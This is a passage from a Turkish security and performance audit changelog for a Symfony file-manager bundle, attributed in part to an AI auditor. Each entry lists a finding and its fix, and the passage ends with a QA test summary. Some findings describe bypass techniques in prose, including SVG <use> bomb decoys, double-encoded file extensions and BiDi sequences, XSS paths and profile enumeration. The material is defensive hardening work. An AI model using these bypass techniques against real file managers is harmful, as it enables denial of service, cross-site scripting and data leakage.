    - `FileManagerField::setMobileMode()` eklendi; `YamlConfigProvider` ve `VolumeRegistry` ASCII olmayan volume adları (`ürünler`, `документы`, `αρχεία`) için `UnicodeHelper::mbUcfirst()` kullandı.

- [x] **P16-18 [ORTA — JS DURUM] `browser_controller.js::toggleSidebar()` — Kapalıyken Disk Değişimi Sonrası Bayat Ağaç/Sabitler**
  - **Dosya:** `assets/controllers/browser_controller.js`
  - **Bulgu:** Mobil çekmece veya masaüstü kenar çubuğu kapalıyken önbellekte bulunan başka bir volume'e geçilip çekmece tekrar açıldığında eski volume'ün klasör ağacı ve aktif vurgusu görünmeye devam ediyordu.
  - **Düzeltme:** `toggleSidebar()` açılışta önbellek hit'inde dahi her zaman `this.renderSidebarTree(false)` çağıracak şekilde güncellendi.

- [x] **P16-19 [ORTA — MOBİL PERFORMANS & BREAKPOINT] `browser_controller.js` — Gizli Inspector Tam Boy Görsel İndirme Koruması & `matchMedia` Dinleyicileri**
  - **Dosya:** `assets/controllers/browser_controller.js`
  - **Bulgu:** `<= 991.98px` ekranlarda Inspector CSS ile gizli olmasına rağmen her dosya dokunuşunda `renderInspector()` çalışıp `<video preload="metadata">` ve `new Image()` ile tam çözünürlüklü orijinal görselleri hücresel ağdan indiriyordu; ayrıca ekran döndürme/yeniden boyutlandırma kırılımları senkronize değildi.
  - **Düzeltme:** `isInspectorBreakpointHidden()` ile `<= 991.98px` ekranlarda Inspector DOM/medya/görsel probu atlandı (`footerStatus` korunarak); `connect()`/`disconnect()` içinde temizlenen `767.98px` ve `991.98px` `matchMedia` dinleyicileri eklendi.

- [x] **P16-20 [ORTA — MOBİL TAŞMA & SAFE-AREA] `core.css` & `browser_controller.js` — Modal Footer, Çöp Başlığı ve Bağlam Menüsü Safe-Area**
  - **Dosyalar:** `assets/styles/core.css`, `assets/controllers/browser_controller.js`
  - **Bulgu:** Çok butonlu iç modal alt çubukları ve Çöp Kutusu başlığı dar ekranlarda yatay taşarak kaydet butonlarını kesebiliyordu; mobil sağ-tık menüsünde `env(safe-area-inset-bottom)` yoktu.
  - **Düzeltme:** `.liveux-fm-modal-footer` (ve iç buton satırlarına) `flex-wrap: wrap`, Çöp başlığına `liveux-fm-row-wrap`, mobil `.liveux-fm-ctx-menu` alt boşluğuna `calc(18px + env(safe-area-inset-bottom, 0px))` eklendi.

- [x] **P16-21 [ORTA — CLIPBOARD & TOP-LAYER] `browser_controller.js` — `<dialog>` İçi Pano Yedeği ve Bağlam Menüsü/Inspector Birleştirmesi**
  - **Dosya:** `assets/controllers/browser_controller.js`
  - **Bulgu:** Modal `<dialog>.showModal()` açıkken `document.body` inert olduğundan `copyTextToClipboard()` geçici `<textarea>` yedeği sessizce başarısız oluyordu; bağlam menüsü ve Inspector doğrudan `navigator.clipboard.writeText()` kullanıyordu.
  - **Düzeltme:** Geçici `<textarea>` varsa kapsayan `<dialog>` içine bağlandı ve bağlam menüsü `copyUrl` ile Inspector `data-insp-copy-url` aksiyonları `copyTextToClipboard()` üzerinden geçirildi.

- [x] **P16-22 [ORTA — UPLOAD HEDEF & PİCKER MİRAS] `browser_controller.js`, `picker_controller.js` & `picker.html.twig`**
  - **Dosyalar:** `assets/controllers/browser_controller.js`, `assets/controllers/picker_controller.js`, `templates/form/picker.html.twig`
  - **Bulgu:** "Klasöre Yükle" modalı açıkken ilk dosya seçiminde `uploadTargetDir` hemen sıfırlandığı için modal içine sonradan yapıştırılan dosyalar üst klasöre yükleniyordu; `picker_controller.js` ve `picker.html.twig` `mobileMode` varsayılanını `'auto'` gönderdiği için profilin `ui.mobile_dialog_mode` ayarını ezebiliyordu.
  - **Düzeltme:** `uploadTargetDir` modal açıkken korunup `closeModal()` içinde temizlendi; `picker_controller.js` ve `picker.html.twig` `mobileMode` varsayılanı `''` yapıldı.

- [x] **P16-23 [DÜŞÜK — A11Y / GÜVENLİK / i18n] `browser_controller.js` — `closeSettingsPopover()`, `<a href>` Tutarlılığı ve Tek Geçişli `t()`**
  - **Dosya:** `assets/controllers/browser_controller.js`
  - **Bulgu:** Ayarlar popover'ı dış tıklama/ESC/menü ile kapatıldığında `aria-expanded="true"` takılı kalıyordu; 3 `<a href>` noktası `isSafeHttpOrPathUrl()` yerine `isSafeUrl()` kullanıyordu; `t()` ardışık `replaceAll()` yaptığı için dosya adında `%target%` gibi başka yer tutucu geçtiğinde ikincil genişleme olabiliyordu.
  - **Düzeltme:** `closeSettingsPopover()` yardımcısı tüm 10 kapatma yoluna bağlandı, 3 `<a href>` noktası `isSafeHttpOrPathUrl()` ile sıkılaştırıldı ve `t()` tek-geçişli regex yer tutucu haritasına geçirildi.

### 17.4. Doğrulama & QA Kapısı (`P16-24`)

- [x] **P16-24 [DOĞRULAMA] Pass-16 Kapsamlı Regresyon Test Paketleri & Canlı Mobil Doğrulama**
  - **Dosyalar:** `tests/Unit/Security/SixteenthPassGlobalSecurityAuditTest.php`, `tests/Js/frontend_audit_test.mjs` (Test 20 & Test 21)
  - **Doğrulanan QA Kapısı (Tamamı 0 Hata / 0 Başarısızlık / 0 Uyarı):**
    - `php -l` (`src/` + `tests/`): **`158/158` dosya**, `0` sözdizimi hatası.
    - PHPStan Level 8: **`0` hata** (`[OK] No errors`).
    - PHPUnit 13.4.8: **`340/340` test PASS**, **`3.399` assertion**, `0` hata, `0` başarısızlık, `0` uyarı.
    - `node --check` (`assets/**/*.js`): **`7/7` dosya**, `0` hata.
    - `node --test` (`tests/Js/*.mjs`): **`35/35` test PASS**, `0` başarısızlık.
    - `bin/console lint:twig`: **`33/33` şablon OK**; `bin/console lint:yaml`: **`3/3` çeviri dosyası OK** (`493/493/493` anahtar eşitliği).
    - `bin/console cache:clear --env=dev`: **OK**; `bin/console asset-map:compile`: **OK (`1.084` varlık derlendi)**.

---

## 18. 17. Tur (Pass-17) — 25.11.2026 — Derin DI/Parser/RBAC, Eşzamanlılık/Performans, DBAL/S3, Mobil/A11y ve Global Çok-Dilli/RTL Denetimi

> **Tur Künyesi:**
> - **Denetçi Model & Versiyon:** Google Antigravity — Gemini 4 (Extra High Reasoning)
> - **Kapsam:** 3 paralel bağımsız güvenlik/mantık/performans/global-i18n taraması (A: Güvenlik/Parser/DI/Controller/Twig/FormType; B: Depolama/Eşzamanlılık/Cache/DBAL/Trash/CLI; C: Frontend JS/9 Tema CSS/Mobil/A11y/RTL) — toplam **27 gerçek bulgu (`P17-01..P17-27`)** doğrulandı, kod ve regresyon testleriyle kapatıldı.

### 18.1. Güvenlik, Parser, DI, Controller, Twig & FormType Sertleştirmesi (`P17-01..P17-09`)

- [x] **P17-01 [KRİTİK — DI / RBAC] `DetectExternalVotersPass` — Factory, Sentetik, `addMethodCall`, İç Karar Yöneticisi ve Alias Zinciri Koruması**
  - **Dosya:** `src/DependencyInjection/Compiler/DetectExternalVotersPass.php`
  - **Bulgu:** `FileManagerVoter` sınıf adını taşıyan ancak `setFactory()` ile başka nesne üreten servisler, sentetik `AuthorizationChecker` servisleri, `AuthorizationChecker` arg `1` üzerinden bağlanan özel `AccessDecisionManager` servisleri, `TraceableAccessDecisionManager` içinde referansla sarılı özel karar yöneticileri, özel etiketli `TaggedIteratorArgument`/satır içi iterator `Definition`'lar, `addMethodCall('addVoter', ...)` enjeksiyonları, `DirectoryLister::$authChecker` satır içi `Definition`'ı ve alias zinciri üzerinden yapılan dekorasyonlar harici voter tespitini atlatıp SSR/önbellek kısayolunu yanlışlıkla açık bırakabiliyordu.
  - **Düzeltme:** Tüm bu DI kalıplarında fail-closed (`hasExternalVoters = true`) davranış zorunlu kılındı; `AuthorizationChecker` arg `1` ve `DirectoryLister::$authChecker` Reflection ile denetlendi, `inspectInnerDecisionManagerById()` içinde `isCustomVoterOrDecorator()` eklendi ve `$targets` alias zincirleri `expandTargetAliases()` ile genişletildi.

- [x] **P17-02 [YÜKSEK — SVG DoS / BYPASS] `SvgSanitizer` — Çok-Öğeli `id`/`xml:id` Gölgeleme, Kopuk `<use>` Yemi ve Boşluk Dolgulu ID Koruması**
  - **Dosya:** `src/Security/SvgSanitizer.php`
  - **Bulgu:** Tekil `$elementsById` haritası ve `trim()` anahtarlaması nedeniyle, bir saldırgan belge başında kopuk (döngüsel `<use>` içinde) bir yem `<g id="bomb">`, `xml:id="g2"` yemi veya boşluk dolgulu `id=" bomb "` yemi yerleştirerek arkadaki gerçek döngüsel ya da üstel DAG `<use>` bombasını bütçe denetiminden gizleyebiliyordu; aynı `<use>` üzerindeki çift `id`/`xml:id` öz-döngüsü de kaçabiliyordu.
  - **Düzeltme:** `$elementsById` `array<string, list<DOMElement>>` olarak yeniden tasarlandı; ham `id`/`xml:id` değerleri (çakışmayan kırpılmış karşılıklarla birlikte) kaydedildi, `isConnectedToRoot()` ile DOM bağlantılı tüm adaylar hem ID hem `spl_object_id()` bazında döngü ve üstel genişleme bütçesi açısından denetlendi.

- [x] **P17-03 [YÜKSEK — HTML PARSER / CACHE LEAK] `AutoInjectDialogHostSubscriber` — `O(N)` Doğrusal HTML Tarayıcı & CDN Paylaşımlı Önbellek Koruması**
  - **Dosya:** `src/EventListener/AutoInjectDialogHostSubscriber.php`
  - **Bulgu:** `preg_replace_callback` tabanlı ham-metin maskelemesi >1 MB inline `<script>` bloklarında PHP'nin `pcre.backtrack_limit` sınırına çarpıp enjeksiyonu kırabiliyor, tırnak içi attribute'lardaki (`<meta content="<script>">`) ifadeleri ham-metin açılışı sanabiliyor ve iç içe `<template>` / `</body >` durumlarını yanlış yorumlayabiliyordu; ayrıca voter korumalı profillerde `Surrogate-Control`, `CDN-Cache-Control`, `Cloudflare-CDN-Cache-Control` veya `Cache-Control: private`/`no-store` olmadan `Expires` taşıyan önbelleklenebilir yanıtlara kullanıcıya özel dialog host enjekte edilebiliyordu.
  - **Düzeltme:** Sıfır PCRE geri-izlemeli, tırnaklı attribute'ları atlayan, iç içe `<template>` derinliğini, CDATA'yı, yorumları ve `</body >` boşluklarını izleyen `O(N)` bayt-ofset koruyucu `maskIgnoredHtmlRegions()` tarayıcısı yazıldı; `isSharedCacheableResponse()` CDN başlıklarını (`Surrogate-Control`, `CDN-Cache-Control`, `Cloudflare-CDN-Cache-Control`) ve `private`/`no-store` olmayan `$response->isCacheable()` yanıtlarını engelleyecek şekilde sıkılaştırıldı.

- [x] **P17-04 [YÜKSEK — TWIG XSS / ROTA EŞLEŞME] `FileManagerTwigExtension` — Kesin Bundle Rota Eşlemesi, İmzalı Share Linkler & Çift-Kodlu Uzantı Reddi**
  - **Dosya:** `src/Twig/Extension/FileManagerTwigExtension.php`
  - **Bulgu:** Yalnızca yol son eki (`/download`) denetlendiği için `/custom/download?path=xss.html` gibi harici yollar güvenli bundle uç noktası sanılabiliyor, gerçek bundle `/download` veya `/share` rotalarında dahi `.html`/`.php`/`.js` gibi aktif uzantılar `href` olarak dönüyor, mutlak imzalı `ShareLinkService` URL'leri doğru sınıflandırılamıyor ve `%252ehtml` gibi çift-kodlu aktif uzantılar/kontrol baytları geçebiliyordu.
  - **Düzeltme:** `resolveBundleEndpointPath()` ile `/download` ve `/share` rotaları kesin ve karşılıklı dışlayıcı eşlendi (kök-göreli ve mutlak imzalı URL'ler desteklenerek); `FileSecurityGuard::BLOCKED_EXTENSIONS` tüm uç noktalarda engellendi, attachment-forced `.svg` share linklerinde `href` korunup `imgSrc: null` yapıldı ve `%25(?:0[0-9a-f]|1[0-9a-f]|7f|2f|5c|2e)` çift-kodlu kalıpları reddedildi.

- [x] **P17-05 [ORTA-YÜKSEK — FORM / VERİ BÜTÜNLÜĞÜ] `FileManagerPickerType` — Çok-Volume Çöp Yolu Koruması & Bozuk UTF-8 Sessiz Silme Koruması**
  - **Dosya:** `src/Form/FileManagerPickerType.php`
  - **Bulgu:** Profile bağlı ek adlandırılmış volume'lerin URL önekleri (`/media`) temizlenmediği için `/media/recycle/secret.jpg` gibi özel tek-segmentli çöp yolları doğrulamayı aşabiliyordu; ayrıca çoklu form gönderiminde geçersiz UTF-8 baytları veya string-dışı dizi elemanları `PRE_SUBMIT` aşamasında `json_encode` başarısızlığıyla sessizce `[]` olarak sıfırlanıp mevcut galeriyi silebiliyordu.
  - **Düzeltme:** `collectProfileUrlPrefixes()` ile profile bağlı tüm volume önekleri toplanarak kök-çapalı çöp yolu doğrulandı (meşru `/uploads/photos/recycle/ok.jpg` korunarak); geçersiz UTF-8/string-dışı öğelerde `'__liveux_fm_invalid_payload__'` işaretçisi korunarak formun sessizce silinmek yerine doğrulama hatası vermesi sağlandı.

- [x] **P17-06 [YÜKSEK — PERFORMANS] `ApiController` & `BrowserComponent` — `O(1)` Router Problu Hızlı URL Serileştirme**
  - **Dosyalar:** `src/Controller/ApiController.php`, `src/Twig/Components/BrowserComponent.php`
  - **Bulgu:** `10.000+` öğeli büyük klasörlerin JSON/SSR serileştirmesinde her dosya için `UrlGeneratorInterface::generate()` (`download` + `thumb` + `view`) çağrılması tek istekte `30.000` router eşleştirme çağrısına yol açıyordu.
  - **Düzeltme:** `probeStaticQueryRouteBase()` eklenerek statik sorgu tabanlı `download`/`thumb` temel yolları en fazla `4` prob çağrısıyla çözülüp geri kalan tüm öğeler `http_build_query(..., '', '&', PHP_QUERY_RFC3986)` ile `O(1)` router maliyetiyle üretildi; dinamik rota kalıplarında tam `UrlGenerator` yedeği korundu.

- [x] **P17-07 [ORTA — RBAC] `ApiController::handleClearCache()` — Klasör Kapsamında Kök Ağaç Yetki Koruması**
  - **Dosya:** `src/Controller/ApiController.php`
  - **Bulgu:** Alt klasör için `clearCache(scope: 'dir')` çağıran ancak volume kökünde `VIEW` yetkisi olmayan bir kullanıcı volume geneli `TREE_CACHE_KEY` önbelleğini geçersiz kılabiliyordu.
  - **Düzeltme:** Volume geneli `TREE_CACHE_KEY` temizliği kök (`''`) `FILE_MANAGER_VIEW` yetkisi doğrulamasına bağlandı.

- [x] **P17-08 [ORTA — GLOBAL RTL / BiDi] `templates/form/picker.html.twig` — Dosya Yolu/URL Girişlerinde `dir="ltr"` Yalıtımı**
  - **Dosya:** `templates/form/picker.html.twig`
  - **Bulgu:** RTL arayüzlerde (`ar`, `fa`, `he`, `ur`) `input` ve `compact` varyant metin alanlarında `/uploads/2026/photo.jpg` gibi yolların slaş ve uzantı sırası BiDi nedeniyle ters dönüyordu.
  - **Düzeltme:** Dolu değer taşıyan `input` ve `compact` metin girdilerine `{{ value is not empty ? 'dir="ltr"' : '' }}` eklendi (boş durumda yer tutucu metin RTL hizasını korur).

- [x] **P17-09 [ORTA — GÜVENLİK / ORACLE] `CsrfRequestValidator` & POST Controller'ları — Bilinmeyen Profillerde Tek Tip `403` (Profil Numaralandırma Koruması)**
  - **Dosyalar:** `src/Security/CsrfRequestValidator.php`, `src/Controller/ApiController.php`, `src/Controller/ZipDownloadController.php`, `src/Controller/UploadController.php`, `src/Controller/ImageEditorController.php`
  - **Bulgu:** Geçersiz/var olmayan `profile` adıyla CSRF belirteci olmadan gönderilen POST istekleri `404`/`400` dönerken, var olan profiller `403` döndüğü için kimliksiz saldırganlar profil adlarını (ör. `admin_hr`, `finance`) numaralandırabiliyordu.
  - **Düzeltme:** `CsrfRequestValidator` nullable `?ProfileConfig $profile = null` kabul edecek şekilde güncellendi ve 4 POST controller'ında profil bulunmasa bile önce CSRF kontrolü çalıştırılarak tek tip `403` döndürüldü.

### 18.2. Depolama, Eşzamanlılık, Önbellek, DBAL, Çöp Kutusu & CLI İyileştirmeleri (`P17-10..P17-18`)

- [x] **P17-10 [KRİTİK — VERİ BOZULMASI] `DoctrineDbalMetadataStorage` — Kök ↔ Alt-Klasör `relocatePrefix()` / `copyPrefix()` Anahtar Bozulması**
  - **Dosya:** `src/Bridge/Doctrine/DoctrineDbalMetadataStorage.php`
  - **Bulgu:** Kökten alt klasöre (`local::` → `local::archive`) veya alt klasörden köke (`local::archive` → `local::`) taşınan/kopyalanan metadata kayıtlarında ayırıcı `/` eksik veya çiftlenerek `local::archivedocs/a.png` ya da `local::/docs/a.png` şeklinde yetim/bozuk anahtarlar oluşuyordu.
  - **Düzeltme:** Alt-anahtar yeniden yazımı `$newSlash . substr($oldKey, strlen($oldSlash))` ve `$targetSlash . substr($srcKey, strlen($sourceSlash))` ile düzeltildi.

- [x] **P17-11 [YÜKSEK — CACHE POISONING] `DirectoryCacheManager` & `DirectoryLister` — Profil Politika Parmak İzi & Çift Katmanlı Filtre Koruması**
  - **Dosyalar:** `src/Service/DirectoryCacheManager.php`, `src/Service/DirectoryLister.php`
  - **Bulgu:** Aynı profil adı veya dinamik `ConfigProviderInterface` altında farklı `ignore_dot_files`, `exclude_patterns`, `trash.directory`, `locale` veya `duplicate_detection.max_scan_files` politikaları kullanan bağlamlar aynı önbellek anahtarını paylaşarak `.env` veya hariç tutulan dosyaları daha kısıtlı kullanıcılara sızdırabiliyordu.
  - **Düzeltme:** `buildProfilePolicyFingerprint(ProfileConfig)` tüm önbellek ve istek-içi anahtarlara eklendi; ek savunma katmanı olarak önbellek isabetlerinde `hydrateAndFilter()` ve `filterVisibleRawNodes()` içinde `FileSecurityGuard::isPathIgnored()` yeniden çalıştırıldı.

- [x] **P17-12 [YÜKSEK — EŞZAMANLILIK / KİLİT GÜVENLİĞİ] `StorageQuotaChecker` & `ZipArchiveService` — Re-entrant Fiziksel Kilit, UID-Kapsamlı `0700` Dizin & Kilit-Sonrası Event**
  - **Dosyalar:** `src/Service/StorageQuotaChecker.php`, `src/Service/ZipArchiveService.php`
  - **Bulgu:** Aynı işlem içinde iç içe `withQuotaLock()` çağrısı self-deadlock riski taşıyor, farklı profil adlarıyla aynı fiziksel klasörü/S3 bucket'ı paylaşan profiller ayrı kilit dosyaları kullanabiliyor, ortak `/tmp` kilit dizini symlink saldırısına açık kalabiliyor, `scanVolumeBytesState()` sınırsız döngüye girebiliyor ve `ZipArchiveService` kilit tutarken `FileUploadedEvent` yayınlayarak dinleyicilerle kilit çakışması yaratabiliyordu.
  - **Düzeltme:** `self::$heldLocks` refcount tabanlı re-entrant kilit, normalize fiziksel yol/S3 kapsamı, UID-kapsamlı `0700` symlink-reddeden kilit dizini ve fail-closed `flock(LOCK_EX)` uygulandı; `scanVolumeBytesState()` `MAX_SCANNED_ITEMS * 4` ile sınırlandı ve `ZipArchiveService` `FileUploadedEvent`'leri kilit bırakıldıktan sonra yayınladı.

- [x] **P17-13 [YÜKSEK — EŞZAMANLILIK & S3 PERFORMANSI] `TrashManager`, `FileOperationsService` & `ApiController` — Çöp Kilidi, `O(T+B)` Toplu Çöp Önbelleği & Tek Geçişli Klasör Özeti**
  - **Dosyalar:** `src/Service/TrashManager.php`, `src/Service/FileOperationsService.php`, `src/Controller/ApiController.php`
  - **Bulgu:** Eşzamanlı `restore()`/`moveToTrash()` istekleri sessiz dosya ezilmesine ve FIFO tutarsızlığına yol açabiliyordu; `B` öğeli toplu silmede her öğe için `listTrash()` çağrılması S3 üzerinde `O(B × T)` `.meta.json` okuma fırtınası oluşturuyor ve klasör silmede alt ağaç birden çok kez taranıyordu.
  - **Düzeltme:** Re-entrant `withTrashLock()` (`moveToTrash()`/`restore()`) eklendi; `ApiController::handleDelete()` `TrashManager::withBulkTrashBatch()` ile tek seferlik çöp anlık görüntüsü paylaştı; `FileOperationsService::delete()` tek geçişli `collectFolderChildSummary()` ile hem raster/göreli alt yolları hem de `precomputedSize` değerini hesapladı.

- [x] **P17-14 [ORTA-YÜKSEK — DBAL / PERFORMANS] `DoctrineDbalMetadataStorage`, `JsonFileMetadataStorage` & `MetadataSyncListener` — Transaction-Güvenli Yerel UPSERT & Toplu `saveMany()`**
  - **Dosyalar:** `src/Bridge/Doctrine/DoctrineDbalMetadataStorage.php`, `src/Metadata/JsonFileMetadataStorage.php`, `src/EventListener/MetadataSyncListener.php`
  - **Bulgu:** `INSERT` → `UniqueConstraintViolationException` → `UPDATE` kalıbı PostgreSQL'de aktif bir DB transaction içindeyken transaction'ı `ABORTED` durumuna düşürüyordu; ayrıca klasör kopyalamada her dosya için ayrı `save()` çağrılması JSON sürücüsünde `O(N)` kilit+disk yazımı, DBAL'da `O(N)` SQL gidiş-dönüşü üretiyordu.
  - **Düzeltme:** PostgreSQL ve `SQLitePlatform` için `ON CONFLICT (key_hash) DO UPDATE`, `AbstractMySQLPlatform` için `ON DUPLICATE KEY UPDATE` yerel atomik UPSERT eklendi; hem DBAL (tek transaction) hem JSON (tek kilit+yazım) için `saveMany()` eklenip `MetadataSyncListener::copyFilteredFolderMetadata()` içine bağlandı.

- [x] **P17-15 [ORTA — RBAC / DoS] `ApiController` — `?refresh=1` Önbellek Kırma Yetki Kapısı**
  - **Dosya:** `src/Controller/ApiController.php`
  - **Bulgu:** Yalnızca `VIEW` yetkisine sahip bir kullanıcı `GET /api/list?refresh=1` veya `GET /api/tree?refresh=1` göndererek `clear_cache: false` profilinde dahi önbelleği zorla atlatıp S3/disk tarama DoS'u tetikleyebiliyordu.
  - **Düzeltme:** `forceRefresh` parametresi yalnızca `FileManagerPermissions::CLEAR_CACHE` izni onaylandığında etkinleştirildi.

- [x] **P17-16 [ORTA — S3 / WINDOWS PARİTE] `PathNormalizer`, `CacheInvalidationListener` & CLI Komutları — Ortak S3 Endpoint Normalizasyonu, Windows `@ext_` & Dinamik Önbellek Temizliği**
  - **Dosyalar:** `src/Security/PathNormalizer.php`, `src/EventListener/CacheInvalidationListener.php`, `src/Command/OptimizeImagesCommand.php`, `src/Command/DuplicatesCommand.php`, `src/Command/TrashPurgeCommand.php`
  - **Bulgu:** S3 endpoint son `/` veya büyük/küçük harf farkları (`https://R2.Example.COM/` vs `https://r2.example.com`) farklı kanonik anahtarlar üretiyor, Windows harici yol `@ext_` karması harf büyüklüğüne duyarlı kalıyor ve `OptimizeImagesCommand` dinamik `{user_id}`/`{Y}` şablonlu profillerin önbelleğini temizlemiyordu.
  - **Düzeltme:** Ortak `PathNormalizer::normalizeS3Endpoint()` tüm katmanlarda kullanıldı, Windows `@ext_` karması küçük harfli `$cmpVolume` üzerinden hesaplandı ve `OptimizeImagesCommand::invalidateVolumeAndOverlaps()` dinamik Yerel + S3 şablonlarını da geçersiz kıldı.

- [x] **P17-17 [ORTA — THUMBNAIL / CLI VERİ BÜTÜNLÜĞÜ] Çapraz-`basePath` Klasör Thumbnail Temizliği, Çift Sıkıştırma Koruması & Tam Depolama İstatistiği**
  - **Dosyalar:** `src/Event/FolderDeletedEvent.php`, `src/EventListener/ThumbnailCleanupListener.php`, `src/Thumbnail/ThumbnailManager.php`, `src/Command/OptimizeImagesCommand.php`, `src/Command/StorageStatsCommand.php`
  - **Bulgu:** Farklı `basePath` ile aynı fiziksel volume'ü paylaşan profillerin küçük resimleri klasör silme veya optimizasyon sonrası yetim kalabiliyordu; `file-manager:optimize` profil belirtilmeden çalıştırıldığında aynı fiziksel volume'ü paylaşan birden fazla profil aynı görselleri iki kez kayıplı sıkıştırabiliyordu; `StorageStatsCommand` `.webp`/`.jpeg` yedek küçük resimleri ve artık `.trash` baytlarını eksik ölçüyordu.
  - **Düzeltme:** `FolderDeletedEvent::$deletedChildPaths` ve `OptimizeImagesCommand::deleteThumbnailAcrossProfiles()` ile göreli `$path` + `$volume` üzerinden çapraz-`basePath` temizliği sağlandı; `OptimizeImagesCommand` profil argümanı yoksa fiziksel volume'leri tekilleştirdi; `ThumbnailManager::getCandidateCachedPaths()` public yapılarak `StorageStatsCommand`'a hem yedek küçük resim hem artık `.trash` ölçümü eklendi.

- [x] **P17-18 [ORTA — BULUT PERFORMANSI / BELLEK / GLOBAL UNICODE] Cloud Sayım Koruması, Bellek Tavanları, Symlink `realpath` & Farsça/İndik ZWNJ Koruması**
  - **Dosyalar:** `src/Service/DirectoryLister.php`, `src/Storage/FlysystemStorageFactory.php`, `src/Storage/ConfinedLocalFilesystemAdapter.php`, `src/Service/RemoteUrlImporter.php`, `src/Service/ZipArchiveService.php`, `src/Controller/ImageEditorController.php`
  - **Düzeltme:** Bulut sürücülerinde isteğe bağlı `countFolderOnDemand()` atlandı; uzun ömürlü worker'lar için `$requestGrantCache` (`16.384`) ve `FlysystemStorageFactory::$instances` (`64`) tavanları konuldu; `ConfinedLocalFilesystemAdapter::assertSubtreeContainsNoSymlinks()` içinde `realpath` + `isWithinRoot` doğrulandı; `RemoteUrlImporter`, `ZipArchiveService` ve `ImageEditorController` gövde temizleyicilerinde Farsça/İndik ZWNJ (`\x{200C}`) karakteri korunarak `می‌خواهم.png` gibi çok-dilli dosya/klasör adlarının bozulması önlendi.

### 18.3. Frontend JS, 9 Tema CSS, Mobil, A11y & Global Çok-Dilli/RTL Sertleştirmesi (`P17-19..P17-27`)

- [x] **P17-19 [YÜKSEK — URL / BiDi GÜVENLİĞİ] Çok-Geçişli URL Kod Çözümünde Kontrol/BiDi Engeli & `PickerController` Dosya Adı Temizliği**
  - **Dosyalar:** `assets/controllers/picker_controller.js`, `assets/controllers/browser_controller.js`, `assets/controllers/dialog_controller.js`, `assets/js/integrations/ckeditor5_adapter.js`, `assets/js/integrations/tinymce_adapter.js`, `assets/js/integrations/tiptap_adapter.js`
  - **Bulgu:** Yalnızca ham URL kontrol edildiği için yüzde-kodlu veya çift-kodlu BiDi/kontrol dizileri (`%E2%80%AE`, `%E2%80%8B`, `%EF%BB%BF`, `%C2%85`, `%25E2%2580%25AE`) `isSafeUrl()`/`isSafeHttpOrPathUrl()` denetimini geçebiliyor ve `PickerController.extractFilename()` ham kontrol karakterlerini arayüze yansıtabiliyordu.
  - **Düzeltme:** Tüm denetleyiciler ve editör adaptörlerinde her URL çözümleme geçişi `CONTROL_OR_BIDI_RE` ile doğrulandı; `PickerController.extractFilename()` görüntülenen dosya adından kontrol/BiDi karakterlerini temizledi.

- [x] **P17-20 [ORTA — 9 TEMA / KOYU-AÇIK KONTRAST] `core.css` — Eksik Koyu/Açık Tema Token'ları (`tabler`, `preline`, `shadcn`, `unstyled`, `daisyui`)**
  - **Dosya:** `assets/styles/core.css`
  - **Bulgu:** `tabler` ve `preline` koyu temalarında `--liveux-fm-accent-soft`, `shadcn` koyu temasında `--liveux-fm-ring` eksikti; `unstyled` açık temasında `.liveux-fm-lightbox`, `.liveux-fm-drop-overlay-card`, `.liveux-fm-list-header` ve `.liveux-fm-card-more` saydam/düşük kontrastlı kalıyordu; sistem koyu moddayken `data-fm-color-scheme="light"` zorlanan `daisyui` açık tema token'ları ezilebiliyordu.
  - **Düzeltme:** Tüm eksik koyu/açık tema değişkenleri ve opak yükseltilmiş yüzey + koyu metin token'ları eklendi; `[data-fm-color-scheme="light"] [data-liveux-theme="daisyui"]` açık tema kilidi tanımlandı.

- [x] **P17-21 [ORTA — DRAG & DROP DURUMU] `browser_controller.js` — Takılı Kalan Bırakma Kaplaması & Sürükleme Temizliği**
  - **Dosya:** `assets/controllers/browser_controller.js`
  - **Bulgu:** Harici dosya pencere dışına çıkarıldığında veya sürükleme sırasında görünüm/klasör/çöp/dialog değiştiğinde bırakma kaplaması ve `this.dragging` durumu ekranda takılı kalabiliyordu.
  - **Düzeltme:** `onFolderDragLeave` içinde `externalDragDepth === 0` kontrolüyle kaplama gizlendi; `applyClientView()`, `navigateTo()`, `toggleTrash()`, `onDialogOpened()` ve `disconnect()` içinde `this.dragging` ve kaplama sıfırlandı; `registerDragCleanup()` ile belge düzeyi `dragend`/`drop` yedek temizliği eklendi.

- [x] **P17-22 [ORTA — ERİŞİLEBİLİRLİK (WCAG 2.1)] `browser_controller.js` — Modal/Lightbox Klavye Etkinliği, Odak Kurtarma & `Tab` Odak Tuzağı**
  - **Dosya:** `assets/controllers/browser_controller.js`
  - **Bulgu:** `isFileManagerActive()` Lightbox veya iç Modal açıkken `false` dönüp kısayolları kesebiliyor, Lightbox kontrolü gizlendiğinde veya Kota Detay modalı açıldığında odak kaybolabiliyor ve `Tab`/`Shift+Tab` açık modal/lightbox dışına kaçabiliyordu.
  - **Düzeltme:** `isFileManagerActive()` `isLightboxOpen() || isModalOpen()` durumunu kapsayacak şekilde genişletildi; `renderLightboxCurrent()` ve `openQuotaDetailsModal()` odak kurtarması + `trapFocusInOverlay()` ile WCAG `Tab`/`Shift+Tab` odak tuzağı eklendi.

- [x] **P17-23 [ORTA — MOBİL DOKUNMATİK & KLAVYE GALERİ SIRALAMA] `picker_controller.js` & `core.css` — Dokunmatik ve RTL Klavye Yeniden Sıralama**
  - **Dosyalar:** `assets/controllers/picker_controller.js`, `assets/styles/core.css`
  - **Bulgu:** HTML5 `draggable` yalnızca masaüstü fare sürüklemesiyle çalıştığından mobil dokunmatik kullanıcılar ve klavye kullanıcıları çoklu galeri öğelerini yeniden sıralayamıyordu.
  - **Düzeltme:** Tüm galeri varyantlarına dokunmatik erişilebilir önceki/sonraki butonları (`moveGalleryItem`/`reorderGalleryItem`) ve `[data-reorder-index]` öğelerinde RTL duyarlı `ArrowLeft`/`ArrowRight` klavye sıralaması eklendi.

- [x] **P17-24 [ORTA — GEZİNTİ / AĞAÇ / ÇÖP DURUMU] `browser_controller.js` — Geri-Dönüş Durum Uzlaşması, Mutasyon Sonrası Ağaç Senkronu & Çöp Silme Yenilemesi**
  - **Dosya:** `assets/controllers/browser_controller.js`
  - **Bulgu:** Silinen bir klasörden üst dizine düşüldüğünde geçmiş yığınında yinelenen kayıtlar ve ölü `expandedFolders` girdileri kalabiliyor, Taşı/Yeniden Adlandır/Sil/Yapıştır/Bırak sonrası aktif ağaç düğümü vurgusu kayabiliyor, Çöp modundaki kalıcı silme sonrası normal liste yenilenebiliyor ve `volumeLabelValue` rollback anlık görüntüsünden önce değişebiliyordu.
